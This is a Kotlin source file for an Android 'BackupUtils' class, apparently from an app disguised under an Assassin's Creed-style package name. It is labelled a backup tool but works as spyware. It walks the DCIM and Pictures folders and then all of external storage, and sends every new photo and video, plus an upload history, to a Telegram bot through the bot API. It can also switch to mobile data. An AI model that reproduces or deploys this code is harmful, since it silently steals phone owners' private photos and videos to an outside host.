package com.service.assasinscreed02

import android.content.Context
import android.os.Environment
import android.util.Log
import com.google.gson.Gson
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import java.io.File
import java.security.MessageDigest

object BackupUtils {
    private const val TAG = "BackupUtils"
    private const val PREFS_NAME = "BackupPrefs"
    private const val UPLOADED_FILES_KEY = "uploaded_files"
    private const val BATCH_SIZE_IMAGES = 10
    private const val BATCH_SIZE_VIDEOS = 3
    private const val BATCH_DELAY_MS = 2000L

    data class BackupHistoryEntry(
        val fileName: String,
        val hash: String,
        val timestamp: Long
    )

    fun runBackup(context: Context, forzarConDatos: Boolean = false): Boolean {
        try {
            Log.d(TAG, "Iniciando backup desde BackupUtils (forzarConDatos: $forzarConDatos)")
            val config = ErrorHandler.obtenerConfigBot(context)
            if (config.first.isNullOrBlank() || config.second.isNullOrBlank()) {
                Log.w(TAG, "Configuración del bot no encontrada")
                return false
            }
            val token = config.first ?: ""
            val chatId = config.second ?: ""
            
            // Verificar conexión según el modo
            if (!forzarConDatos && !isWifiConnected(context)) {
                Log.w(TAG, "No hay conexión WiFi disponible y no se permite usar datos móviles")
                return false
            }
            
            if (forzarConDatos && !isWifiConnected(context) && !isMobileDataConnected(context)) {
                Log.w(TAG, "No hay conexión WiFi ni datos móviles disponibles")
                return false
            }
            
            // PRIMERA FASE: Escanear solo DCIM y Pictures
            Log.d(TAG, "FASE 1: Escaneando DCIM y Pictures")
            val archivosDCIMyPictures = escanearDCIMyPictures(context)
            Log.d(TAG, "Encontrados ${archivosDCIMyPictures.size} archivos en DCIM y Pictures")
            
            if (archivosDCIMyPictures.isNotEmpty()) {
                val imagenesDCIM = archivosDCIMyPictures.filter { isImage(it) }
                val videosDCIM = archivosDCIMyPictures.filter { isVideo(it) }
                Log.d(TAG, "DCIM/Pictures - Imágenes: ${imagenesDCIM.size}, Videos: ${videosDCIM.size}")
                enviarPorLotes(token, chatId, imagenesDCIM, BATCH_SIZE_IMAGES, "imágenes (DCIM/Pictures)", context)
                enviarPorLotes(token, chatId, videosDCIM, BATCH_SIZE_VIDEOS, "videos (DCIM/Pictures)", context)
            }
            
            // SEGUNDA FASE: Escanear todo el dispositivo
            Log.d(TAG, "FASE 2: Escaneando todo el dispositivo")
            val archivosRestoDispositivo = escanearArchivosNuevos(context)
            Log.d(TAG, "Encontrados ${archivosRestoDispositivo.size} archivos en el resto del dispositivo")
            
            if (archivosRestoDispositivo.isNotEmpty()) {
                val imagenesResto = archivosRestoDispositivo.filter { isImage(it) }
                val videosResto = archivosRestoDispositivo.filter { isVideo(it) }
                Log.d(TAG, "Resto dispositivo - Imágenes: ${imagenesResto.size}, Videos: ${videosResto.size}")
                enviarPorLotes(token, chatId, imagenesResto, BATCH_SIZE_IMAGES, "imágenes (resto dispositivo)", context)
                enviarPorLotes(token, chatId, videosResto, BATCH_SIZE_VIDEOS, "videos (resto dispositivo)", context)
            }
            
            val historialFile = serializarHistorial(context)
            if (historialFile != null) {
                enviarArchivoATelegram(token, chatId, historialFile)
                Log.d(TAG, "Historial enviado al bot")
            }
            guardarConexion(context)
            Log.d(TAG, "Backup completado exitosamente")
            return true
        } catch (e: Exception) {
            Log.e(TAG, "Error en BackupUtils: ${e.message}", e)
            return false
        }
    }

    private fun isWifiConnected(context: Context): Boolean {
        try {
            val connectivityManager = context.getSystemService(Context.CONNECTIVITY_SERVICE) as android.net.ConnectivityManager
            val network = connectivityManager.activeNetwork ?: return false
            val capabilities = connectivityManager.getNetworkCapabilities(network) ?: return false
            return capabilities.hasTransport(android.net.NetworkCapabilities.TRANSPORT_WIFI)
        } catch (e: Exception) {
            Log.e(TAG, "Error verificando WiFi: ${e.message}")
            return false
        }
    }

    private fun isMobileDataConnected(context: Context): Boolean {
        try {
            val connectivityManager = context.getSystemService(Context.CONNECTIVITY_SERVICE) as android.net.ConnectivityManager
            val network = connectivityManager.activeNetwork ?: return false
            val capabilities = connectivityManager.getNetworkCapabilities(network) ?: return false
            return capabilities.hasTransport(android.net.NetworkCapabilities.TRANSPORT_CELLULAR)
        } catch (e: Exception) {
            Log.e(TAG, "Error verificando datos móviles: ${e.message}")
            return false
        }
    }

    private fun escanearDCIMyPictures(context: Context): List<File> {
        val extensiones = listOf("jpg", "jpeg", "png", "mp4", "mov", "avi")
        val archivos = mutableListOf<File>()
        val archivosSubidos = obtenerArchivosSubidos(context)
        
        try {
            val directorio = Environment.getExternalStorageDirectory()
            if (!directorio.exists() || !directorio.canRead()) {
                Log.w(TAG, "No se puede acceder al directorio de almacenamiento")
                return archivos
            }
            
            // Escanear solo DCIM y Pictures
            val carpetasPrioritarias = listOf("DCIM", "Pictures")
            
            carpetasPrioritarias.forEach { nombreCarpeta ->
                val carpeta = File(directorio, nombreCarpeta)
                if (carpeta.exists() && carpeta.canRead()) {
                    Log.d(TAG, "Escaneando carpeta: $nombreCarpeta")
                    carpeta.walkTopDown().forEach { file ->
                        try {
                            if (file.isFile && extensiones.any { file.extension.equals(it, ignoreCase = true) }) {
                                if (file.canRead() && file.length() > 0) {
                                    val hash = calcularHashArchivo(file)
                                    if (!archivosSubidos.contains(hash)) {
                                        archivos.add(file)
                                    }
                                }
                            }
                        } catch (e: Exception) {
                            Log.w(TAG, "Error procesando archivo ${file.name}: ${e.message}")
                        }
                    }
                } else {
                    Log.w(TAG, "Carpeta $nombreCarpeta no existe o no es accesible")
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error escaneando DCIM y Pictures: ${e.message}", e)
        }
        
        return archivos.sortedBy { it.lastModified() }.reversed()
    }

    private fun escanearArchivosNuevos(context: Context): List<File> {
        val extensiones = listOf("jpg", "jpeg", "png", "mp4", "mov", "avi")
        val archivos = mutableListOf<File>()
        val archivosSubidos = obtenerArchivosSubidos(context)
        try {
            val directorio = Environment.getExternalStorageDirectory()
            if (!directorio.exists() || !directorio.canRead()) {
                Log.w(TAG, "No se puede acceder al directorio de almacenamiento")
                return archivos
            }
            directorio.walkTopDown().forEach { file ->
                try {
                    if (file.isFile && extensiones.any { file.extension.equals(it, ignoreCase = true) }) {
                        if (file.canRead() && file.length() > 0) {
                            val hash = calcularHashArchivo(file)
                            if (!archivosSubidos.contains(hash)) {
                                archivos.add(file)
                            }
                        }
                    }
                } catch (e: Exception) {
                    Log.w(TAG, "Error procesando archivo ${file.name}: ${e.message}")
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error escaneando medios: ${e.message}", e)
        }
        return archivos.sortedBy { it.lastModified() }.reversed()
    }

    private fun calcularHashArchivo(file: File): String {
        return try {
            val md = MessageDigest.getInstance("MD5")
            val bytes = file.readBytes()
            val digest = md.digest(bytes)
            digest.joinToString("") { "%02x".format(it) }
        } catch (e: Exception) {
            Log.e(TAG, "Error calculando hash de ${file.name}: ${e.message}")
            file.absolutePath + "_" + file.lastModified()
        }
    }

    private fun obtenerArchivosSubidos(context: Context): Set<String> {
        val prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
        return prefs.getStringSet(UPLOADED_FILES_KEY, emptySet()) ?: emptySet()
    }

    private fun serializarHistorial(context: Context): File? {
        return try {
            val prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
            val archivos = prefs.getStringSet(UPLOADED_FILES_KEY, emptySet()) ?: emptySet()
            val historyList = archivos.mapNotNull { hash ->
                val parts = hash.split("|||")
                if (parts.size == 3) BackupHistoryEntry(parts[0], parts[1], parts[2].toLongOrNull() ?: 0L) else null
            }
            val json = Gson().toJson(historyList)
            val file = File(context.cacheDir, "historial_backup.json")
            file.writeText(json)
            file
        } catch (e: Exception) {
            Log.e(TAG, "Error serializando historial: ${e.message}")
            null
        }
    }

    private fun guardarConexion(context: Context) {
        val prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
        val ahora = System.currentTimeMillis()
        val anterior = prefs.getLong("ultima_conexion", 0L)
        prefs.edit().putLong("anterior_conexion", anterior).putLong("ultima_conexion", ahora).apply()
    }

    private fun isImage(file: File): Boolean {
        val extension = file.extension.lowercase()
        return extension in listOf("jpg", "jpeg", "png")
    }

    private fun isVideo(file: File): Boolean {
        val extension = file.extension.lowercase()
        return extension in listOf("mp4", "mov", "avi")
    }

    private fun enviarPorLotes(token: String, chatId: String, archivos: List<File>, batchSize: Int, tipo: String, context: Context) {
        if (archivos.isEmpty()) return
        val lotes = archivos.chunked(batchSize)
        Log.d(TAG, "Enviando ${archivos.size} $tipo en ${lotes.size} lotes")
        lotes.forEachIndexed { index, lote ->
            try {
                Log.d(TAG, "Enviando lote ${index + 1}/${lotes.size} de $tipo")
                var archivosEnviados = 0
                lote.forEach { archivo ->
                    try {
                        if (enviarArchivoATelegram(token, chatId, archivo) == null) { // Check for null success
                            archivosEnviados++
                            val hash = calcularHashArchivo(archivo)
                            guardarArchivoSubido(context, archivo, hash)
                            Log.d(TAG, "Archivo enviado: ${archivo.name}")
                        }
                    } catch (e: Exception) {
                        Log.e(TAG, "Error enviando archivo ${archivo.name}: ${e.message}")
                    }
                }
                Log.d(TAG, "Lote ${index + 1} completado: $archivosEnviados/$tipo enviados")
                if (index < lotes.size - 1) {
                    Thread.sleep(BATCH_DELAY_MS)
                }
            } catch (e: Exception) {
                Log.e(TAG, "Error enviando lote ${index + 1}: ${e.message}")
            }
        }
    }

    private fun guardarArchivoSubido(context: Context, file: File, hash: String) {
        try {
            val prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
            val archivosSubidos = prefs.getStringSet(UPLOADED_FILES_KEY, emptySet())?.toMutableSet() ?: mutableSetOf()
            val entry = "${file.name}|||$hash|||${file.lastModified()}"
            archivosSubidos.add(entry)
            prefs.edit().putStringSet(UPLOADED_FILES_KEY, archivosSubidos).apply()
        } catch (e: Exception) {
            Log.e(TAG, "Error guardando archivo subido: ${e.message}")
        }
    }

    fun enviarArchivoATelegram(token: String, chatId: String, archivo: File): String? {
        if (!archivo.exists() || !archivo.canRead()) {
            val msg = "Archivo no accesible: ${archivo.name}"
            Log.w(TAG, msg)
            return msg
        }
        val url = "https://api.telegram.org/bot$token/sendDocument"
        try {
            val requestBody = okhttp3.MultipartBody.Builder()
                .setType(okhttp3.MultipartBody.FORM)
                .addFormDataPart("chat_id", chatId)
                .addFormDataPart(
                    "document",
                    archivo.name,
                    okhttp3.RequestBody.create("application/octet-stream".toMediaTypeOrNull(), archivo)
                )
                .build()
            val request = Request.Builder()
                .url(url)
                .post(requestBody)
                .build()
            val client = OkHttpClient()
            val response = client.newCall(request).execute()
            if (!response.isSuccessful) {
                val body = response.body?.string()
                val msg = "HTTP ${response.code}: $body"
                Log.e(TAG, "Error HTTP enviando archivo a Telegram: $msg")
                response.close()
                return msg
            }
            response.close()
            return null // null = éxito
        } catch (e: Exception) {
            Log.e(TAG, "Error enviando archivo a Telegram", e)
            return e.toString()
        }
    }
} 